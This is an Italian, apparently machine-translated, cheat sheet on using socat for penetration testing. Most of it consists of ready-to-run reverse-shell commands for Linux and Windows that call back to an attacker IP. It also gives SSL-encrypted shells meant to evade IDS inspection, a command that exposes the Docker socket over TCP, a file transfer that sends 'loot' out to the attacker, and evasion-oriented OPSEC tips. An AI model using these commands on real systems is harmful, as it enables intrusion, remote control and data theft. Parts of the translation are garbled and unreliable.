<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔄 Socat - Scheda completa

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```
<palign="centro">
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Sfruttamento e conchiglie">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protocolli">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licenza GPLv2">
</p>

<palign="centro">
  <b>🌐 Stabilisci due flussi di byte bidirezionali e trasferisci i dati tra file, pipe, dispositivi, socket e tunnel SSL</b>
</p>

---

## 📋 Sommario

- [Panoramica e architettura Socat](#-panoramica--l'architettura-socat)
- [Confronto tra Socat e Netcat](#-socat-vs-netcat-confronto)
- [Installazione](#-installazione)
- [Shell inverse TTY completamente interattive](#-shell-tty-reverse-completamente-interattive)
  - [Attaccante ascoltatore (RAW TTY)](#attaccante-ascoltatore-raw-tty)
  - [Carico utile di destinazione (spawn Pty)](#carico utile target-pty-spawn)
  - [Shell inversa di destinazione di Windows](#shell-destinazione-inversa di Windows)
- [Reverse Shell crittografate tramite SSL/TLS](#-encrypted-reverse-shells-via-ssltls)
  - [Generazione di certificati](#generazione-certificati)
  - [Ascoltatore e connessione crittografati](#ascoltatore-crittografato--connessione)
- [Inoltro porte e relè di rete](#-port-forwarding--network-relay)
  - [Inoltro porta locale](#inoltro porta locale)
  - [Listener fork (multi-client)](#listener-multi-client)
  - [Inoltro da socket di dominio UNIX a TCP (inoltro Docker)](#unix-domain-socket-to-tcp-relay-docker-forwarding)
- [Trasferimenti di file con Socat](#-file-transfers-with-socat)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e OPSEC](#-considerazioni-difensive--opsec)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e architettura Socat

**Socat** (SOcket CAT) è un'utilità basata su riga di comando che stabilisce due flussi di byte bidirezionali e trasferisce i dati tra di loro. Poiché i flussi possono essere costruiti da un vasto insieme di tipi di indirizzi (file, pipe, dispositivi, socket TCP/UDP, SSL, IP non elaborato, SOCKS4, socket di dominio UNIX), Socat viene spesso descritto come Netcat con steroidi.

Nei test di penetrazione e nel Red Teaming, Socat è leggendario per due superpoteri fondamentali:
1. **Conchiglie inverse TTY completamente interattive istantanee:** Generazione di veri pseudoterminali (`pty`) con controllo del lavoro, tasti freccia e completamento automatico senza bisogno della ginnastica Python o `stty raw -echo`.
2. **Tunnel di rete SSL/TLS crittografati:** Bypassare l'ispezione IDS standard crittografando i payload in chiaro su SSL.

---

## ⚖️ Confronto tra Socat e Netcat

| Caratteristica | Netcat (`nc`) | Nmap `ncat` | Socat (`socat`) |
|---------|------|-----|-----------------|
| **Spawn di shell PTY nativo** | ❌No | ❌No | ✅ Nativo (`pty,stderr,setsid`) |
| **Crittografia SSL/TLS** | ❌No | ✅ Sì (`--ssl`) | ✅ Nativo (`OPENSSL-LISTEN`, `OPENSSL`) |
| **Forking dell'inoltro multi-client**| ❌No | ❌No | ✅ Nativo (`fork,reuseaddr`) |
| **Socket di dominio UNIX** | ❌No | ✅ Limitato | ✅ Nativo (`UNIX-LISTEN`, `UNIX-CONNECT`) |
| **Dimensione file binario** | Minimo (~40 KB) | Moderato (~500 KB) | Moderato (~400 KB autonomo) |
| **Sintassi dei comandi** | Bandiere semplici (`-lvnp`) | Basato su flag (`-lvnp`) | Sintassi del flusso (`<type>:<args>`) |

---

## 📥Installazione
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```
---

## 💀 Gusci inversi TTY completamente interattivi

Quando prendi una shell inversa con Netcat standard, ricevi una shell stupida instabile. Socat consente uno pseudo-terminale stabile al 100%, completamente interattivo con completamento mediante tabulazione, gestione Ctrl+C e supporto per l'editor dello schermo (`vim`, `nano`).

### Ascoltatore dell'attaccante (RAW TTY)
```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
> [!NOTA]
> `file:`tty`,raw,echo=0` mette il tuo terminale locale in modalità raw e disabilita l'eco dei caratteri. Se la connessione si chiude inaspettatamente e il tuo terminale non risponde, digita `reset` e premi Invio.

### Carico utile target (Spawn Pty)
```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
#### Ripartizione delle opzioni:
- `pty`: assegna uno pseudo-terminale sul sistema di destinazione.
- `stderr`: reindirizza l'errore standard nel socket.
- `setsid`: esegue il processo in un nuovo gruppo di sessioni (impedisce l'uccisione all'uscita del genitore).
- `sigint`: passa segnali di interruzione (Ctrl+C) al processo remoto invece di terminare la sessione.
- `sane`: ripristina le impostazioni di controllo del terminale ai valori predefiniti standard.

### Shell inversa di destinazione di Windows
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```
---

## 🔐 Reverse Shell crittografate tramite SSL/TLS

Impedisci a Network Security Monitoring (NSM), Zeek e Snort di ispezionare il payload della shell inversa crittografando il traffico con un certificato SSL/TLS temporaneo.

### Generazione di certificati
```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```
### Ascoltatore e connessione crittografati
```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
---

## 🔀 Port forwarding e relè di rete

Socat può inoltrare il traffico in entrata da un'interfaccia o porta di rete direttamente a una destinazione remota diversa.

### Inoltro porta locale
```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```
### Listener con fork (multi-client)

L'opzione `fork` consente a Socat di generare un processo figlio per ogni nuova connessione in entrata, mantenendo aperto il listener principale:
```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```
### Inoltro da socket di dominio UNIX a TCP (inoltro Docker)

Quando si accede a un socket daemon Docker locale (`/var/run/docker.sock`) senza diritti di root sulla rete:
```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```
---

## 📁 Trasferimenti di file con Socat
```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```
*(Il flag `-u` specifica la modalità unidirezionale dal primo indirizzo al secondo).*

---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Ascoltatore TTY interattivo** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **Carico utile TTY interattivo** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **Listener SSL crittografato** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **Payload SSL crittografato** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **Inoltro porta (Relè)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **Esporre il socket UNIX** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **Trasferimento file (destinatario)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **Trasferimento file (mittente)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |

---

## 🛡️ Considerazioni difensive e OPSEC

1. **Crittografia del traffico:** Le shell inverse TCP in chiaro espongono i comandi a IDS/IPS. Usa sempre `OPENSSL-LISTEN` e `OPENSSL` durante gli scontri con la squadra rossa.
2. **Monitoraggio del processo:** le piattaforme Sysmon/EDR contrassegnano i comandi che invocano `pty,stderr,setsid` come euristica della shell inversa immediata.
3. **Binari autonomi:** durante la distribuzione sui sistemi di destinazione, utilizzare binari Socat autonomi compilati staticamente per evitare dipendenze di librerie condivise.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Questo cheatsheet è destinato esclusivamente ai test di penetrazione autorizzati, alle valutazioni di sicurezza e alla ricerca accademica. L'accesso non autorizzato ai sistemi informatici e la manomissione della rete sono strettamente illegali.